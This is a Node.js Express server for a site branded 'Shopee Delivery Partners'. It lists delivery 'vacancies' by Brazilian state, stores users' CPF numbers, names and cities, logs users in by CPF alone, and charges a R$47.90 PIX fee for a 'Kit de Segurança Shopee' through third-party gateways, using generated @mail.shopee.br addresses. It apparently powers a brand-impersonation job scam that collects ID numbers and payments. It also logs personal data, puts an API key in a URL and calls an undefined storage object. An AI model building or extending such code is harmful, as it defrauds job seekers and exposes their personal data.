// Servidor de produção simples - build uma vez e serve estático
const express = require('express');
const cors = require('cors');
const compression = require('compression');
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');

const PORT = process.env.PORT || 5000;
const app = express();

// Middlewares essenciais
app.use(cors({
  origin: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false
}));
app.use(compression());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: false, limit: '10mb' }));

// Estados do Brasil
const mockRegions = [
  { name: "Acre", abbr: "AC", vacancies: 4 },
  { name: "Alagoas", abbr: "AL", vacancies: 5 },
  { name: "Amapá", abbr: "AP", vacancies: 3 },
  { name: "Amazonas", abbr: "AM", vacancies: 7 },
  { name: "Bahia", abbr: "BA", vacancies: 10 },
  { name: "Ceará", abbr: "CE", vacancies: 8 },
  { name: "Distrito Federal", abbr: "DF", vacancies: 12 },
  { name: "Espírito Santo", abbr: "ES", vacancies: 6 },
  { name: "Goiás", abbr: "GO", vacancies: 9 },
  { name: "Maranhão", abbr: "MA", vacancies: 5 },
  { name: "Mato Grosso", abbr: "MT", vacancies: 6 },
  { name: "Mato Grosso do Sul", abbr: "MS", vacancies: 5 },
  { name: "Minas Gerais", abbr: "MG", vacancies: 14 },
  { name: "Pará", abbr: "PA", vacancies: 7 },
  { name: "Paraíba", abbr: "PB", vacancies: 5 },
  { name: "Paraná", abbr: "PR", vacancies: 11 },
  { name: "Pernambuco", abbr: "PE", vacancies: 9 },
  { name: "Piauí", abbr: "PI", vacancies: 4 },
  { name: "Rio de Janeiro", abbr: "RJ", vacancies: 18 },
  { name: "Rio Grande do Norte", abbr: "RN", vacancies: 5 },
  { name: "Rio Grande do Sul", abbr: "RS", vacancies: 12 },
  { name: "Rondônia", abbr: "RO", vacancies: 4 },
  { name: "Roraima", abbr: "RR", vacancies: 3 },
  { name: "Santa Catarina", abbr: "SC", vacancies: 10 },
  { name: "São Paulo", abbr: "SP", vacancies: 26 },
  { name: "Sergipe", abbr: "SE", vacancies: 4 },
  { name: "Tocantins", abbr: "TO", vacancies: 4 }
];

// Produção: assumir que build já foi feito durante deploy
let buildComplete = true;
let buildError = null;

// Middleware para log
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  next();
});

// Rotas da API
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    env: process.env.NODE_ENV || 'production',
    port: PORT,
    buildComplete,
    buildError
  });
});

app.get('/api/regions', (req, res) => {
  res.json(mockRegions);
});

// Cache para consultas de veículos
const vehicleInfoCache = {};

app.get('/api/vehicle-info/:placa', async (req, res) => {
  // Headers CORS
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, Accept');
  
  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }
  
  try {
    const { placa } = req.params;
    
    if (!placa) {
      return res.status(400).json({ error: 'Placa do veículo não fornecida' });
    }
    
    // Limpar a placa
    const vehiclePlate = placa.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
    
    // Verificar cache
    if (vehicleInfoCache[vehiclePlate]) {
      console.log(`[CACHE] Usando dados em cache para placa: ${vehiclePlate}`);
      return res.json(vehicleInfoCache[vehiclePlate]);
    }
    
    console.log(`[INFO] Consultando informações do veículo com placa: ${vehiclePlate}`);
    
    // Verificar se existe API key
    if (!process.env.VEHICLE_API_KEY) {
      console.log('[AVISO] API Key de veículos não configurada, usando dados de teste');
      const testData = {
        marca: `Toyota (Teste)`,
        modelo: "COROLLA", 
        ano: "2022",
        cor: "PRATA",
        chassi: "TEST" + vehiclePlate.slice(-4),
        situacao: "0",
        message: "Dados de teste - configure VEHICLE_API_KEY no Heroku"
      };
      vehicleInfoCache[vehiclePlate] = testData;
      return res.json(testData);
    }
    
    // Tentar consultar API externa
    const apiKey = process.env.VEHICLE_API_KEY;
    const keyPreview = apiKey.substring(0, 5) + '...' + apiKey.substring(apiKey.length - 3);
    console.log(`[DEBUG] API key presente: ${keyPreview}`);
    
    try {
      console.log('[DEBUG] Tentando consulta direta com chave na URL');
      const fetch = (await import('node-fetch')).default;
      const apiUrl = `https://wdapi2.com.br/consulta/${vehiclePlate}/${apiKey}`;
      
      const response = await fetch(apiUrl, {
        method: 'GET',
        headers: {
          'User-Agent': 'ShopeeDeliveryApp/1.0'
        },
        timeout: 5000
      });
      
      if (response.ok) {
        const data = await response.json();
        console.log('[INFO] Dados do veículo obtidos via API externa');
        vehicleInfoCache[vehiclePlate] = data;
        return res.json(data);
      } else {
        console.log(`[AVISO] API externa retornou status: ${response.status}`);
      }
    } catch (apiError) {
      console.error('[ERRO] Falha na consulta de veículo:', apiError.message);
    }
    
    // Fallback para dados de teste
    console.log('[DEBUG] Fornecendo dados de veículo de teste para produção');
    const fallbackData = {
      marca: `Toyota (Teste)`,
      modelo: "COROLLA",
      ano: "2022", 
      cor: "PRATA",
      chassi: "TEST" + vehiclePlate.slice(-4),
      situacao: "0",
      message: "Dados de teste - API externa indisponível"
    };
    
    vehicleInfoCache[vehiclePlate] = fallbackData;
    res.json(fallbackData);
    
  } catch (error) {
    console.error('[ERRO] Erro ao consultar veículo:', error);
    res.status(500).json({ 
      error: 'Erro ao consultar informações do veículo',
      message: error.message
    });
  }
});

app.get('/api/check-ip-status', (req, res) => {
  const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
  
  res.json({
    status: 'allowed',
    message: 'IP não está bloqueado',
    ip: clientIp,
    timestamp: new Date().toISOString()
  });
});

app.post('/api/payments/create-pix', (req, res) => {
  const { name, cpf, email, phone, amount } = req.body;
  
  console.log('Recebido pedido de pagamento:', { name, cpf, email, phone, amount });
  
  if (!name || !cpf || !amount) {
    return res.status(400).json({ error: 'Dados incompletos' });
  }
  
  const paymentId = `pix_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
  const pixCode = `00020126580014BR.GOV.BCB.PIX0136${cpf}5204000053039865802BR5913Shopee${name}6009SAO PAULO62070503***6304${Math.floor(Math.random() * 10000)}`;
  const pixQrCode = `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
  
  const pixResponse = {
    id: paymentId,
    pixCode: pixCode,
    pixQrCode: pixQrCode,
    status: 'pending'
  };
  
  console.log('Enviando resposta de pagamento:', pixResponse);
  res.json(pixResponse);
});

// Sistema duplo de gateways PIX (Pagnet + Medius Pag) para produção
app.post('/api/proxy/for4payments/pix', async (req, res) => {
  try {
    // Verificar qual gateway usar baseado na variável de ambiente
    const gatewayChoice = process.env.GATEWAY_CHOICE || 'PAGNET';
    
    console.log(`[GATEWAY PROD] Usando gateway: ${gatewayChoice}`);
    
    // Processar os dados recebidos
    const { name, cpf, email, phone, amount = 47.90, description = "Kit de Segurança Shopee" } = req.body;
    
    if (!name || !cpf) {
      return res.status(400).json({ error: 'Nome e CPF são obrigatórios' });
    }
    
    // Gerar email se não fornecido
    const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
    
    console.log('Dados recebidos:', { name, cpf: `${cpf.substring(0, 3)}***${cpf.substring(cpf.length - 2)}`, amount });
    
    let pixResponse = null;
    
    if (gatewayChoice === 'MEDIUS_PAG') {
      // USAR MEDIUS PAG
      if (!process.env.MEDIUS_PAG_SECRET_KEY) {
        console.error('ERRO: MEDIUS_PAG_SECRET_KEY não configurada no Heroku');
        return res.status(500).json({
          error: 'Gateway Medius Pag não configurado. Configure a chave secreta no Heroku.',
        });
      }
      
      console.log('Iniciando transação Medius Pag no Heroku...');
      
      // Integração direta com Medius Pag API
      const mediusUrl = 'https://api.mediuspag.com/functions/v1';
      const authString = `${process.env.MEDIUS_PAG_SECRET_KEY}:x`;
      const authHeader = `Basic ${Buffer.from(authString).toString('base64')}`;
      
      // Usar CPF real do usuário
      const customerCpf = cpf.replace(/[^0-9]/g, '');
      console.log(`[MEDIUS PAG PROD] Usando CPF do usuário: ${customerCpf.substring(0, 3)}***${customerCpf.substring(customerCpf.length - 2)}`);
      
      const amountCents = Math.round(parseFloat(amount.toString()) * 100);
      
      // Payload para infoproduto - sem endereço de entrega
      const payload = {
        customer: {
          name: name,
          email: userEmail,
          phone: (phone || '11999999999').replace(/[^0-9]/g, ''),
          document: {
            type: "CPF",
            number: customerCpf
          },
          // Explicitamente não solicitar endereço para produto digital
          addressRequired: false
        },
        paymentMethod: "PIX",
        pix: {
          expiresInDays: 3
        },
        items: [{
          title: description || 'Kit Digital de Segurança',
          unitPrice: amountCents,
          quantity: 1,
          externalRef: `MP${Date.now()}${Math.floor(Math.random() * 10000)}`,
          tangible: false, // Produto digital
          digital: true    // Marcar explicitamente como digital
        }],
        amount: amountCents,
        // Configurações específicas para produto digital
        shippingRequired: false,
        digitalProduct: true
      };
      
      console.log('Enviando payload para Medius Pag API:', JSON.stringify(payload, null, 2));
      
      const fetch = (await import('node-fetch')).default;
      const response = await fetch(`${mediusUrl}/transactions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': authHeader,
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      });
      
      console.log('Response status da Medius Pag:', response.status);
      
      const responseData = await response.json();
      console.log('Response data da Medius Pag:', JSON.stringify(responseData, null, 2));
      
      if (!response.ok) {
        console.error('Erro da Medius Pag API:', response.status, responseData);
        return res.status(500).json({
          error: 'Erro ao processar pagamento via Medius Pag. Tente novamente.',
          details: responseData.message || 'Erro desconhecido'
        });
      }
      
      // Extrair dados do PIX da resposta Medius Pag
      const transactionId = responseData.id;
      let pixCode = '';
      
      // Buscar PIX code na estrutura aninhada da Medius Pag
      if (responseData.pix && typeof responseData.pix === 'object') {
        pixCode = responseData.pix.qrcode || responseData.pix.pixCopyPaste || '';
      }
      
      // Fallback para estrutura principal
      if (!pixCode) {
        pixCode = responseData.pixCopyPaste || responseData.pixCode || '';
      }
      
      console.log('Transaction ID extraído (Medius):', transactionId);
      console.log('PIX Code extraído (Medius):', pixCode ? 'ENCONTRADO' : 'NÃO ENCONTRADO');
      
      if (!pixCode) {
        console.error('PIX code não encontrado na resposta da Medius Pag. Resposta completa:', responseData);
        return res.status(500).json({ error: 'Erro ao gerar código PIX via Medius Pag' });
      }
      
      // Gerar QR Code URL
      const pixQrCode = responseData.pix?.pixQrCode || `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
      
      pixResponse = {
        id: transactionId,
        pixCode: pixCode,
        pixQrCode: pixQrCode,
        status: 'pending',
        emailSent: false
      };
      
      console.log('✅ Transação Medius Pag criada com sucesso:', transactionId);
      
    } else {
      // USAR PAGNET (PADRÃO)
      if (!process.env.PAGNET_PUBLIC_KEY || !process.env.PAGNET_SECRET_KEY) {
        console.error('ERRO: PAGNET_PUBLIC_KEY ou PAGNET_SECRET_KEY não configuradas no Heroku');
        return res.status(500).json({
          error: 'Gateway Pagnet não configurado. Configure as chaves de API Pagnet no Heroku.',
        });
      }
      
      console.log('Iniciando transação Pagnet no Heroku...');
      
      // Integração direta com Pagnet API
      const baseUrl = 'https://api.pagnetbrasil.com/v1';
      const authString = `${process.env.PAGNET_PUBLIC_KEY}:${process.env.PAGNET_SECRET_KEY}`;
      const authHeader = `Basic ${Buffer.from(authString).toString('base64')}`;
      
      // Preparar dados da transação
      const amountCents = Math.round(parseFloat(amount.toString()) * 100);
      const customerCpf = cpf.replace(/[^0-9]/g, '');
      const customerPhone = (phone || '11999999999').replace(/[^0-9]/g, '');
      
      const payload = {
        amount: amountCents,
        paymentMethod: 'pix',
        pix: { expiresInDays: 3 },
        items: [{
          title: 'Kit de Segurança Shopee',
          unitPrice: amountCents,
          quantity: 1,
          tangible: false
        }],
        customer: {
          name: name,
          email: userEmail,
          document: { type: 'cpf', number: customerCpf },
          phone: customerPhone
        },
        externalReference: `PIX${Date.now()}${Math.floor(Math.random() * 10000)}`
      };
      
      console.log('Enviando payload para Pagnet API...');
      
      // Fazer requisição para Pagnet
      const fetch = (await import('node-fetch')).default;
      const response = await fetch(`${baseUrl}/transactions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': authHeader,
          'User-Agent': 'ShopeeDeliveryApp/1.0'
        },
        body: JSON.stringify(payload)
      });
      
      console.log('Response status da Pagnet:', response.status);
      
      const responseData = await response.json();
      console.log('Response data da Pagnet:', JSON.stringify(responseData, null, 2));
      
      if (!response.ok) {
        console.error('Erro da Pagnet API:', response.status, responseData);
        return res.status(500).json({
          error: 'Erro ao processar pagamento. Tente novamente.',
          details: responseData.message || 'Erro desconhecido'
        });
      }
      
      // Extrair dados do PIX da resposta
      const transactionId = responseData.id;
      const pixCode = responseData.pix?.qrcode || '';
      
      console.log('Transaction ID extraído:', transactionId);
      console.log('PIX Code extraído:', pixCode ? 'ENCONTRADO' : 'NÃO ENCONTRADO');
      
      if (!pixCode) {
        console.error('PIX code não encontrado na resposta da Pagnet. Resposta completa:', responseData);
        return res.status(500).json({ error: 'Erro ao gerar código PIX' });
      }
      
      // Gerar QR Code URL
      const pixQrCode = `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
      
      pixResponse = {
        id: transactionId,
        pixCode: pixCode,
        pixQrCode: pixQrCode,
        status: 'pending',
        emailSent: false
      };
      
      console.log('✅ Transação Pagnet criada com sucesso:', transactionId);
    }
    
    console.log('Enviando resposta para frontend:', JSON.stringify(pixResponse, null, 2));
    
    // Garantir que a resposta seja enviada corretamente
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.status(200).json(pixResponse);
    
  } catch (error) {
    console.error(`Erro ao processar pagamento via ${process.env.GATEWAY_CHOICE || 'PAGNET'}:`, error);
    res.setHeader('Content-Type', 'application/json');
    res.status(500).json({
      error: 'Erro interno do servidor ao processar pagamento',
      message: error.message
    });
  }
});

// ===== ENDPOINTS PARA USUÁRIOS DO APP =====

// Conexão com PostgreSQL
const { Pool } = require('pg');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

// Verificar e criar tabela de usuários do app se não existir
(async () => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS app_users (
        id SERIAL PRIMARY KEY,
        cpf VARCHAR(14) UNIQUE NOT NULL,
        name VARCHAR(255) NOT NULL,
        city VARCHAR(255) NOT NULL,
        state VARCHAR(2) NOT NULL,
        selected_cities JSONB DEFAULT '[]'::jsonb,
        reached_delivery_page BOOLEAN DEFAULT false,
        created_at TIMESTAMP DEFAULT NOW(),
        updated_at TIMESTAMP DEFAULT NOW()
      )
    `);
    console.log('✅ Tabela app_users verificada/criada no PostgreSQL');
  } catch (error) {
    console.error('❌ Erro ao criar tabela app_users:', error);
  }
})();

// Endpoint para salvar dados do usuário
app.post('/api/app-users/save-profile', async (req, res) => {
  try {
    const { cpf, name, city, state } = req.body;
    
    if (!cpf || !name || !city || !state) {
      return res.status(400).json({
        success: false,
        message: 'CPF, nome, cidade e estado são obrigatórios'
      });
    }
    
    console.log('📝 Salvando dados do usuário no banco:', { cpf, name, city, state });
    
    // Inserir ou atualizar no banco de dados
    const result = await pool.query(`
      INSERT INTO app_users (cpf, name, city, state, updated_at)
      VALUES ($1, $2, $3, $4, NOW())
      ON CONFLICT (cpf) 
      DO UPDATE SET 
        name = $2,
        city = $3,
        state = $4,
        updated_at = NOW()
      RETURNING id, cpf, name, city, state
    `, [cpf, name, city, state]);
    
    const userData = result.rows[0];
    
    console.log('✅ Usuário salvo no banco:', userData);
    
    res.json({
      success: true,
      message: 'Dados do usuário salvos com sucesso',
      user: {
        cpf: userData.cpf,
        name: userData.name,
        city: userData.city,
        state: userData.state,
        id: userData.id
      }
    });
  } catch (error) {
    console.error('❌ Erro ao salvar dados do usuário:', error);
    res.status(500).json({
      success: false,
      message: 'Erro ao salvar dados do usuário',
      error: error.message
    });
  }
});

// Endpoint para login com CPF
app.post('/api/app-users/login', async (req, res) => {
  try {
    const { cpf } = req.body;
    
    if (!cpf) {
      return res.status(400).json({
        success: false,
        message: 'CPF é obrigatório'
      });
    }
    
    console.log('🔐 Tentativa de login com CPF:', cpf);
    
    // Buscar usuário no banco de dados
    const result = await pool.query(`
      SELECT id, cpf, name, city, state, selected_cities, reached_delivery_page, created_at
      FROM app_users 
      WHERE cpf = $1
    `, [cpf]);
    
    if (result.rows.length > 0) {
      const userData = result.rows[0];
      console.log('✅ Login realizado com sucesso:', userData.name);
      res.json({
        success: true,
        message: 'Login realizado com sucesso',
        user: {
          id: userData.id,
          cpf: userData.cpf,
          name: userData.name,
          city: userData.city,
          state: userData.state,
          selectedCities: userData.selected_cities || [],
          reachedDeliveryPage: userData.reached_delivery_page || false
        }
      });
    } else {
      console.log('❌ CPF não encontrado no banco:', cpf);
      res.status(404).json({
        success: false,
        message: 'CPF não encontrado. Faça o cadastro primeiro.'
      });
    }
  } catch (error) {
    console.error('❌ Erro no endpoint de login:', error);
    res.status(500).json({
      success: false,
      message: 'Erro interno do servidor',
      error: error.message
    });
  }
});

// Endpoint para salvar cidades selecionadas
app.post('/api/app-users/save-cities', async (req, res) => {
  try {
    const { cpf, cities } = req.body;
    
    if (!cpf || !cities) {
      return res.status(400).json({
        success: false,
        message: 'CPF e cidades são obrigatórios'
      });
    }
    
    console.log('🏙️ Salvando cidades para CPF:', cpf, 'Cidades:', cities);
    
    const userData = appUsersStorage.get(cpf);
    
    if (userData) {
      userData.selectedCities = cities;
      appUsersStorage.set(cpf, userData);
      
      res.json({
        success: true,
        message: 'Cidades salvas com sucesso',
        cities: userData.selectedCities
      });
    } else {
      res.status(404).json({
        success: false,
        message: 'Usuário não encontrado'
      });
    }
  } catch (error) {
    console.error('❌ Erro ao salvar cidades:', error);
    res.status(500).json({
      success: false,
      message: 'Erro interno do servidor',
      error: error.message
    });
  }
});


// Middleware para APIs não encontradas
app.use('/api/*', (req, res) => {
  res.status(404).json({
    error: 'API endpoint not found',
    path: req.originalUrl
  });
});

// Servir arquivos estáticos buildados
app.use(express.static(path.join(__dirname, 'dist/public'), {
  maxAge: '1d', // Cache por 1 dia
  etag: true
}));

// Rota para SPA (Single Page Application)
app.get('*', (req, res) => {
  const buildPath = path.join(__dirname, 'dist/public');
  const indexPath = path.join(buildPath, 'index.html');
  
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    console.log('⚠️ Arquivo index.html não encontrado, retornando página de erro');
    res.status(404).send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Shopee Delivery Partners</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
            .container { max-width: 600px; margin: 0 auto; }
            .error { background: #ffebee; border: 1px solid #f44336; padding: 20px; margin: 20px 0; border-radius: 4px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Shopee Delivery Partners</h1>
            <p>Arquivos não encontrados</p>
            <div class="error">
                <strong>Status:</strong> Build não foi executado durante o deploy
            </div>
            <p>Entre em contato com o suporte técnico.</p>
        </div>
    </body>
    </html>
    `);
  }
});

// Cleanup
process.on('SIGTERM', () => {
  console.log('Recebido SIGTERM, encerrando...');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('Recebido SIGINT, encerrando...');
  process.exit(0);
});

// Iniciar servidor
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Servidor Heroku rodando na porta ${PORT}`);
  console.log(`🌐 Ambiente: ${process.env.NODE_ENV || 'production'}`);
  console.log(`🎯 Gateway escolhido: ${process.env.GATEWAY_CHOICE || 'PAGNET'}`);
  console.log(`📦 Servindo arquivos estáticos de: ${path.join(__dirname, 'dist/public')}`);
});